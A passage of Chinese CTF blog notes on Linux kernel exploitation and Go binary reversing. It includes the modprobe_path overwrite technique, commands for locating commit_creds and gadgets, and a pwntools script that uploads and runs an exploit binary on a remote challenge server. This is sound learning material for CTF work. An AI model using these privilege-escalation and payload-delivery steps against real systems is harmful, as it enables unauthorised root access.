  <span class="string">rsp,0xb0</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad20:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x48</span>]<span class="string">,rdx</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad24:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x40</span>]<span class="string">,rcx</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad28:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x38</span>]<span class="string">,r8</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad2c:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x30</span>]<span class="string">,r9</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad30:</span>  <span class="string">mov</span>    <span class="string">rax,QWORD</span> <span class="string">PTR</span> <span class="string">gs:0x28</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad39:</span>  <span class="string">mov</span>    <span class="string">QWORD</span> <span class="string">PTR</span> [<span class="string">rbp-0x60</span>]<span class="string">,rax</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad3d:</span>  <span class="string">xor</span>    <span class="string">eax,eax</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad3f:</span>  <span class="string">test</span>   <span class="string">dil,dil</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad42:</span>  <span class="string">jne</span>    <span class="number">0xffffffffbb2aaec8</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad48:</span>  <span class="string">cmp</span>    <span class="string">BYTE</span> <span class="string">PTR</span> [<span class="string">rip+0x59d711</span>]<span class="string">,0x0</span>        <span class="comment"># 0xffffffffbb848460</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad4f:</span>  <span class="string">je</span>     <span class="number">0xffffffffbb2ab024</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad55:</span>  <span class="string">lea</span>    <span class="string">rax,[rbp-0x58]</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad59:</span>  <span class="string">lea</span>    <span class="string">rcx,[rbp-0xb0]</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad60:</span>  <span class="string">mov</span>    <span class="string">rdx,r12</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad63:</span>  <span class="string">mov</span>    <span class="string">esi,0x38</span></span><br><span class="line">   <span class="attr">0xffffffffbb2aad68:</span>  <span class="string">lea</span>    <span class="string">rdi,[rbp-0x98]</span></span><br><span class="line"></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/s</span> <span class="number">0xffffffffbb848460</span></span><br><span class="line"><span class="attr">0xffffffffbb848460:</span>     <span class="string">&quot;/sbin/modprobe&quot;</span></span><br></pre></td></tr></table></figure><p>那么，总结一下该 技术的使用条件：</p><ul><li>知道 modprobe_path地址</li><li>拥有一个任意地址写漏洞，用于修改 modprobe_path内容</li></ul><h2 id="阅读情况：大致了解"><a href="#阅读情况：大致了解" class="headerlink" title="@###阅读情况：大致了解"></a>@###阅读情况：大致了解</h2><h1 id="内核调试命令"><a href="#内核调试命令" class="headerlink" title="内核调试命令"></a>内核调试命令</h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cpuinfo  <span class="comment"># 查看所开保护</span></span><br><span class="line"><span class="built_in">cat</span> /proc/slabinfo  <span class="comment"># 查看内核堆块</span></span><br></pre></td></tr></table></figure><h2 id="获取-ROP-地址"><a href="#获取-ROP-地址" class="headerlink" title="获取 ROP 地址"></a>获取 ROP 地址</h2><p>这块有时 ROPgadget 快，有时 ropper 快，随缘吧</p><h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p>使用方法：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./vmlinux &gt; _gadget.txt</span><br></pre></td></tr></table></figure><h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><p>使用方法：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --no-color -f ./vmlinux &gt; gadget.txt</span><br></pre></td></tr></table></figure><h2 id="获取函数地址"><a href="#获取函数地址" class="headerlink" title="获取函数地址"></a>获取函数地址</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsmod  <span class="comment"># 查看装载驱动，也是获得内核文件加载的基地址</span></span><br><span class="line">grep prepare_kernel_cred  /proc/kallsyms</span><br><span class="line">grep commit_creds  /proc/kallsyms</span><br></pre></td></tr></table></figure><p>此处若是开了地址随机化，需要先改启动脚本，使 kaslr 变成 nokaslr，然后获取一个栈地址，将其记录</p><p>之后再把 nokaslr 改回 kaslr，运行脚本获得之前所记录地址处对应的新地址，做差，记录这个差值为 stackbase</p><p>之后把获得的所有的内核地址都加上这个 stackbase，即差值，才能获得在开启 kaslr 下的真实地址</p><h1 id="gdb-multiarch-调试命令"><a href="#gdb-multiarch-调试命令" class="headerlink" title="gdb-multiarch 调试命令"></a>gdb-multiarch 调试命令</h1><p>一般来说用 gdb 就可以，跨平台的话就要用 gdb-multiarch</p><h2 id="设置架构"><a href="#设置架构" class="headerlink" title="设置架构"></a>设置架构</h2><p>在 startvm.sh 脚本上设置好端口后就可以用 gdb-multiarch 来调试了</p><p>首先要根据使用的 qemu 来设置系统架构，设置命令为<code>set architecture 内核系统架构</code></p><p>架构有很多，我用的是 qemu 3.0.0，是在 Ubuntu 16.04 下自行编译安装的，因为默认版本很老</p><p>不过 Ubuntu 18.04 之后的 qemu 都是 3.0.0 以后的版本，所以按需搭配自己喜欢的环境就好</p><p>架构一览：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">aarch64                        mips:4400</span><br><span class="line">aarch64:ilp32                  mips:4600</span><br><span class="line">alpha                          mips:4650</span><br><span class="line">alpha:ev4                      mips:5000</span><br><span class="line">alpha:ev5                      mips:5400</span><br><span class="line">alpha:ev6                      mips:5500</span><br><span class="line">arm                            mips:5900</span><br><span class="line">armv2                          mips:6000</span><br><span class="line">armv2a                         mips:7000</span><br><span class="line">armv3                          mips:8000</span><br><span class="line">armv3m                         mips:9000</span><br><span class="line">armv4                          mips:isa32</span><br><span class="line">armv4t                         mips:isa32r2</span><br><span class="line">armv5                          mips:isa32r3</span><br><span class="line">armv5t                         mips:isa32r5</span><br><span class="line">armv5te                        mips:isa32r6</span><br><span class="line">auto                           mips:isa64</span><br><span class="line">ep9312                         mips:isa64r2</span><br><span class="line">hppa1.0                        mips:isa64r3</span><br><span class="line">i386                           mips:isa64r5</span><br><span class="line">i386:intel                     mips:isa64r6</span><br><span class="line">i386:nacl                      mips:loongson_2e</span><br><span class="line">i386:x64-32                    mips:loongson_2f</span><br><span class="line">i386:x64-32:intel              mips:loongson_3a</span><br><span class="line">i386:x64-32:nacl               mips:micromips</span><br><span class="line">i386:x86-64                    mips:mips5</span><br><span class="line">i386:x86-64:intel              mips:octeon</span><br><span class="line">i386:x86-64:nacl               mips:octeon+</span><br><span class="line">i8086                          mips:octeon2</span><br><span class="line">ia64-elf32                     mips:octeon3</span><br><span class="line">ia64-elf64                     mips:sb1</span><br><span class="line">iwmmxt                         mips:xlr</span><br><span class="line">iwmmxt2                        powerpc:403</span><br><span class="line">m32r                           powerpc:601</span><br><span class="line">m32r2                          powerpc:603</span><br><span class="line">m32rx                          powerpc:604</span><br><span class="line">m68k                           powerpc:620</span><br><span class="line">m68k:5200                      powerpc:630</span><br><span class="line">m68k:5206e                     powerpc:7400</span><br><span class="line">m68k:521x                      powerpc:750</span><br><span class="line">m68k:5249                      powerpc:EC603e</span><br><span class="line">m68k:528x                      powerpc:MPC8XX</span><br><span class="line">m68k:5307                      powerpc:a35</span><br><span class="line">m68k:5407                      powerpc:common</span><br><span class="line">m68k:547x                      powerpc:common64</span><br><span class="line">m68k:548x                      powerpc:e500</span><br><span class="line">m68k:68000                     powerpc:e500mc</span><br><span class="line">m68k:68008                     powerpc:e500mc64</span><br><span class="line">m68k:68010                     powerpc:e5500</span><br><span class="line">m68k:68020                     powerpc:e6500</span><br><span class="line">m68k:68030                     powerpc:rs64ii</span><br><span class="line">m68k:68040                     powerpc:rs64iii</span><br><span class="line">m68k:68060                     powerpc:titan</span><br><span class="line">m68k:cfv4e                     powerpc:vle</span><br><span class="line">m68k:cpu32                     rs6000:6000</span><br><span class="line">m68k:fido                      rs6000:rs1</span><br><span class="line">m68k:isa-a                     rs6000:rs2</span><br><span class="line">m68k:isa-a:emac                rs6000:rsc</span><br><span class="line">m68k:isa-a:mac                 s390:31-bit</span><br><span class="line">m68k:isa-a:nodiv               s390:64-bit</span><br><span class="line">m68k:isa-aplus                 sh</span><br><span class="line">m68k:isa-aplus:emac            sh-dsp</span><br><span class="line">m68k:isa-aplus:mac             sh2</span><br><span class="line">m68k:isa-b                     sh2a</span><br><span class="line">m68k:isa-b:emac                sh2a-nofpu</span><br><span class="line">m68k:isa-b:<span class="built_in">float</span>               sh2a-nofpu-or-sh3-nommu</span><br><span class="line">m68k:isa-b:<span class="built_in">float</span>:emac          sh2a-nofpu-or-sh4-nommu-nofpu</span><br><span class="line">m68k:isa-b:<span class="built_in">float</span>:mac           sh2a-or-sh3e</span><br><span class="line">m68k:isa-b:mac                 sh2a-or-sh4</span><br><span class="line">m68k:isa-b:nousp               sh2e</span><br><span class="line">m68k:isa-b:nousp:emac          sh3</span><br><span class="line">m68k:isa-b:nousp:mac           sh3-dsp</span><br><span class="line">m68k:isa-c                     sh3-nommu</span><br><span class="line">m68k:isa-c:emac                sh3e</span><br><span class="line">m68k:isa-c:mac                 sh4</span><br><span class="line">m68k:isa-c:nodiv               sh4-nofpu</span><br><span class="line">m68k:isa-c:nodiv:emac          sh4-nommu-nofpu</span><br><span class="line">m68k:isa-c:nodiv:mac           sh4a</span><br><span class="line">mips                           sh4a-nofpu</span><br><span class="line">mips:10000                     sh4al-dsp</span><br><span class="line">mips:12000                     sh5</span><br><span class="line">mips:14000                     sparc</span><br><span class="line">mips:16                        sparc:sparclet</span><br><span class="line">mips:16000                     sparc:sparclite</span><br><span class="line">mips:3000                      sparc:sparclite_le</span><br><span class="line">mips:3900                      sparc:v8plus</span><br><span class="line">mips:4000                      sparc:v8plusa</span><br><span class="line">mips:4010                      sparc:v8plusb</span><br><span class="line">mips:4100                      sparc:v9</span><br><span class="line">mips:4111                      sparc:v9a</span><br><span class="line">mips:4120                      sparc:v9b</span><br><span class="line">mips:4300                      xscale</span><br></pre></td></tr></table></figure><p>假使 startvm.sh 上面所写的 qemu 种类是 qemu-system-x86_64</p><p>那么就用 i386:x86-64 架构，输入命令如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> architecture i386:x86-64</span><br></pre></td></tr></table></figure><h2 id="连接端口"><a href="#连接端口" class="headerlink" title="连接端口"></a>连接端口</h2><p>命令如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure><h2 id="读取内核文件符号表及内核加载基地址"><a href="#读取内核文件符号表及内核加载基地址" class="headerlink" title="读取内核文件符号表及内核加载基地址"></a>读取内核文件符号表及内核加载基地址</h2><p>先用 extract-vmlinux 命令提取 vmlinux 文件，命令如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure><p>然后先用 root 用户登录，在里面输入 lsmod 获得模块加载的基地址：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn <span class="comment"># $ lsmod</span></span><br><span class="line">baby 16384 1 - Live 0xffffffffc0000000 (POE)</span><br></pre></td></tr></table></figure><p>之后启动的时候这么启动：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./vmlinux -ex <span class="string">&quot;set architecture i386:x86-64&quot;</span> -ex <span class="string">&quot;add-symbol-file ./baby.ko 0xffffffffc0000000&quot;</span> -ex <span class="string">&quot;target remote localhost:2222&quot;</span></span><br></pre></td></tr></table></figure><h1 id="eth0-1"><a href="#eth0-1" class="headerlink" title="eth0&#x2F;1"></a>eth0&#x2F;1</h1><p>eth0 eth0:1 和eth0.1三者的关系对应于物理网卡、子网卡、虚拟VLAN网卡的关系：<br><strong>物理网卡：物理网卡这里指的是服务器上实际的网络接口设备，这里我服务器上双网卡，在系统中看到的2个物理网卡分别对应是eth0和eth1这两个网络接口。</strong></p><p><strong>子网卡</strong>：子网卡在这里并不是实际上的网络接口设备，但是可以作为网络接口在系统中出现，如eth0:1、eth1:2这种网络接口。它们必须要依赖于物理网卡，虽然可以与物理网卡的网络接口同时在系统中存在并使用不同的IP地址，而且也拥有它们自己的网络接口配置文件。但是当所依赖的物理网卡不启用时（Down状态）这些子网卡也将一同不能工作。</p><p><strong>虚拟VLAN网卡</strong>：这些虚拟VLAN网卡也不是实际上的网络接口设备，也可以作为网络接口在系统中出现，但是与子网卡不同的是，他们没有自己的配置文件。他们只是通过将物理网加入不同的VLAN而生成的VLAN虚拟网卡。如果将一个物理网卡通过vconfig命令添加到多个VLAN当中去的话，就会有多个VLAN虚拟网卡出现，他们的信息以及相关的VLAN信息都是保存在&#x2F;proc&#x2F;net&#x2F;vlan&#x2F;config这个临时文件中的，而没有独自的配置文件。它们的网络接口名是eth0.1、eth1.2这种名字。</p><p>注意：当需要启用VLAN虚拟网卡工作的时候，关联的物理网卡网络接口上必须没有IP地址的配置信息，并且，这些主物理网卡的子网卡也必须不能被启用和必须不能有IP地址配置信息。这个在网上看到的结论根据我的实际测试结果来看是不准确的，物理网卡本身可以绑定IP，并且给本征vlan提供通信网关的功能，但必须是在802.1q下。</p><h1 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h1><p><code>socket</code>就是插座 ( 中文翻译成<strong>套接字</strong>有点莫名其妙)，运行在计算机中的两个程序通过socket建立起一个通道，数据在通道中传输。 socket把复杂的TCP&#x2F;IP协议族隐藏了起来，对程序员来说只要用好socket相关的函数，就可以完成网络通信。</p><h1 id="管道-1"><a href="#管道-1" class="headerlink" title="管道"></a>管道</h1><p>​管道的实质上就是一个文件系统，然后pipe指令会返回两个文件描述符，一个读一个写，而管道是单向的，就是在输入的时候不能输出，因此通常创建pipe两个管道一个用于输出，一个用于输入，管道分为管道本身（就是一个普通的类似流之类的），和管道数据（处于一个空间）。</p><p>​在创建子进程的时候，管道本身会被复制，到那时管道数据确实共享的，这样就能实现数据的传输</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282213696.png" alt="image-20240402232429087"></p><h1 id="远程脚本"><a href="#远程脚本" class="headerlink" title="远程脚本"></a>远程脚本</h1><p><strong>pack.sh</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/zsh</span></span><br><span class="line"> </span><br><span class="line">gcc \</span><br><span class="line">    ./exp.c \</span><br><span class="line">    -o exp    \</span><br><span class="line">    -masm=intel \</span><br><span class="line">    --static  \</span><br><span class="line">    -g</span><br><span class="line"> </span><br><span class="line"><span class="built_in">chmod</span> 777 ./exp</span><br><span class="line"> </span><br><span class="line">find . | cpio -o --format=newc &gt; ./rootfs.cpio</span><br><span class="line"><span class="built_in">chmod</span> 777 ./rootfs.cpio</span><br></pre></td></tr></table></figure><p><strong>gdbinit</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file ./vmlinux</span><br><span class="line">target remote 127.0.0.1:1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure><h2 id="远程脚本-1"><a href="#远程脚本-1" class="headerlink" title="远程脚本"></a>远程脚本</h2><p>为了减小远程exp的体积，使用musl进行静态编译（）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sa =  <span class="keyword">lambda</span> x,y : p.sendafter(x,y)</span><br><span class="line">ru =  <span class="keyword">lambda</span> x   : p.recvuntil(x)</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;114.116.233.171&#x27;</span>, <span class="number">10006</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;$ &#x27;</span>, cmd)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    lg = log.progress(<span class="string">&#x27;Upload&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    encoded = <span class="built_in">str</span>(encoded)[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">300</span>):</span><br><span class="line">        lg.status(<span class="string">&#x27;%d / %d&#x27;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        send_cmd(<span class="string">&#x27;echo -n &quot;%s&quot; &gt;&gt; benc&#x27;</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">    send_cmd(<span class="string">&#x27;cat benc | base64 -d &gt; bout&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;chmod +x bout&#x27;</span>)</span><br><span class="line">    lg.success()</span><br><span class="line"> </span><br><span class="line">os.system(<span class="string">&#x27;musl-gcc -w -s -static -o3 exp.c -o exp&#x27;</span>)</span><br><span class="line">upload()</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;kernel笔记&quot;&gt;&lt;a href=&quot;#kernel笔记&quot; class=&quot;headerlink&quot; title=&quot;kernel笔记&quot;&gt;&lt;/a&gt;kernel笔记&lt;/h1&gt;&lt;p&gt;首先是要配置环境，推荐[wiki](&lt;a href=&quot;https://ctf-wiki.or</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="http://s1nec-1o.github.io/categories/kernel-pwn/"/>
    
    
    <category term="kernel" scheme="http://s1nec-1o.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>GO-Pwn</title>
    <link href="http://s1nec-1o.github.io/2024/04/28/GO-Pwn/"/>
    <id>http://s1nec-1o.github.io/2024/04/28/GO-Pwn/</id>
    <published>2024-04-28T11:09:59.000Z</published>
    <updated>2024-04-28T14:12:27.272Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GO-PWN"><a href="#GO-PWN" class="headerlink" title="GO-PWN"></a>GO-PWN</h1><p>首先go的二进制文件分析与C&#x2F;C++二进制文件分析大有不同，有些老东西都不能运用得当</p><p>我们先讲述不同的点</p><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a><a href="https://tiancaiamao.gitbooks.io/go-internals/content/zh/03.5.html">函数调用约定</a></h2><p>在 Go 语言中，<code>goroutine</code> 是一种轻量级的执行单元，用于并发执行代码。它可以看作是一种轻量级的线程，由 Go 运行时系统进行管理。与传统的线程相比，<code>goroutine</code> 具有更小的栈空间占用和更低的创建和销毁开销。</p><p>Go1.3版本之后则使用的是continuous stack，下面将具体分析一下这种技术。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>每次执行函数调用时Go的runtime都会进行检测，若当前栈的大小不够用，则会触发“中断”，从当前函数进入到Go的运行时库，Go的运行时库会保存此时的函数上下文环境，然后分配一个新的足够大的栈空间，将旧栈的内容拷贝到新栈中，并做一些设置，使得当函数恢复运行时，函数会在新分配的栈中继续执行，仿佛整个过程都没发生过一样，这个函数会觉得自己使用的是一块大小“无限”的栈空间。</p><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p>在研究Go的实现细节之前让我们先自己思考一下应该如何实现。第一步肯定要有某种机制检测到当前栈大小不够用了，这个应该是把当前的栈寄存器SP跟栈的可用栈空间的边界进行比较。能够检测到栈大小不够用，就相当于捕捉到了“中断”。</p><p>捕获完“中断”，第二步要做的，就应该是进入运行时，保存当前goroutine的上下文。别陷入如何保存上下文的细节，先假如我们把函数栈增长时的上下文保存好了，那下一步就是分配新的栈空间了，我们可以将分配空间想象成就是调用一下malloc而已。</p><p>接下来怎么办呢？我们要将旧栈中的内容拷贝到新栈中，然后让函数继续在新栈中运行。这里先暂时忽略旧栈内容拷贝到新栈中的一些技术难点，假设在新栈空间中恢复了“中断”时的上下文，从运行时返回到函数。</p><p>函数在新的栈中继续运行了，但是还有个问题：函数如何返回。因为函数返回后栈是要缩小的，否则就会内存浪费空间了，所以还需要在函数返回时处理栈缩小的问题。</p><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>首先写一个test.go文件，内容如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    main()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后生成汇编文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go tool <span class="number">6</span>g -S test.go | head <span class="number">-8</span></span><br></pre></td></tr></table></figure><p>可以看以输出是：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">000000</span> <span class="number">00000</span> (test.<span class="keyword">go</span>:<span class="number">3</span>)    TEXT    <span class="string">&quot;&quot;</span>.main+<span class="number">0</span>(SB),$<span class="number">0</span><span class="number">-0</span></span><br><span class="line"><span class="number">000000</span> <span class="number">00000</span> (test.<span class="keyword">go</span>:<span class="number">3</span>)    MOVQ    (TLS),CX</span><br><span class="line"><span class="number">0x0009</span> <span class="number">00009</span> (test.<span class="keyword">go</span>:<span class="number">3</span>)    CMPQ    SP,(CX)</span><br><span class="line"><span class="number">0x000c</span> <span class="number">00012</span> (test.<span class="keyword">go</span>:<span class="number">3</span>)    JHI    ,<span class="number">21</span></span><br><span class="line"><span class="number">0x000e</span> <span class="number">00014</span> (test.<span class="keyword">go</span>:<span class="number">3</span>)    CALL    ,runtime.morestack00_noctxt(SB)</span><br><span class="line"><span class="number">0x0013</span> <span class="number">00019</span> (test.<span class="keyword">go</span>:<span class="number">3</span>)    JMP    ,<span class="number">0</span></span><br><span class="line"><span class="number">0x0015</span> <span class="number">00021</span> (test.<span class="keyword">go</span>:<span class="number">3</span>)    NOP    ,</span><br></pre></td></tr></table></figure><p>让我们好好看一下这些指令。(TLS)取到的是结构体G的第一个域，也就是g-&gt;stackguard地址，将它赋值给CX。然后CX地址的值与SP进行比较，如果SP大于g-&gt;stackguard了，则会调用runtime.morestack函数。<strong>这几条指令的作用就是检测栈是否溢出。</strong></p><p>不过并不是所有函数在链接时都会插入这种指令。如果你读源代码，可能会发现<code>#pragma textflag 7</code>，或者在汇编函数中看到<code>TEXT reuntime.exit(SB),7,$0</code>，这种函数就是不会检测栈溢出的。<strong>这个是编译标记，控制是否生成栈溢出检测指令。</strong></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li>使用分段栈的函数头几个指令检测SP和stackguard，调用runtime.morestack</li><li>runtime.morestack函数的主要功能是保存当前的栈的一些信息，然后转换成调度器的栈调用runtime.newstack</li><li>runtime.newstack函数的主要功能是分配空间，装饰此空间，将旧的frame和arg弄到新空间</li><li>使用gogocall的方式切换到新分配的栈，gogocall使用的JMP返回到被中断的函数</li><li>继续执行遇到RET指令时会返回到runtime.lessstack，lessstack做的事情跟morestack相反，它要准备好从new stack到old stack</li></ol><p>整个过程有点像一次中断，中断处理时保存当时的现场，弄个新的栈，中断恢复时恢复到新栈中运行。栈的收缩是垃圾回收的过程中实现的．当检测到栈只使用了不到1&#x2F;4时，栈缩小为原来的1&#x2F;2.</p><h2 id="函数调用寄存器"><a href="#函数调用寄存器" class="headerlink" title="函数调用寄存器"></a>函数调用寄存器</h2><ol><li>Go1.17.1之前的函数调用，参数都在栈上传递；Go1.17.1以后，9个以内的参数在寄存器传递，9个以外的在栈上传递；</li><li>Go1.17.1之前版本，callee函数返回值通过caller栈传递；Go1.17.1以后，函数调用的返回值，9个以内通过寄存器传递回caller，9个以外在栈上传递；</li></ol><p>这九个寄存器优先级从高到低是：</p><p><code>ax &gt; bx &gt; cx &gt; di &gt; si &gt; r8 &gt; r9 &gt; r10 &gt; r11</code></p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>由于恶意软件大都是被 strip 处理过，已经去除了二进制文件里的调试信息和函数符号，所以 Go 二进制文件的逆向分析技术的探索，前期主要围绕着函数符号的恢复来展开。</p><p>由于网上的资料都甚少，至少我没搜到，因此我就自己编译自己逆一些程序</p><h1 id="编译及逆向"><a 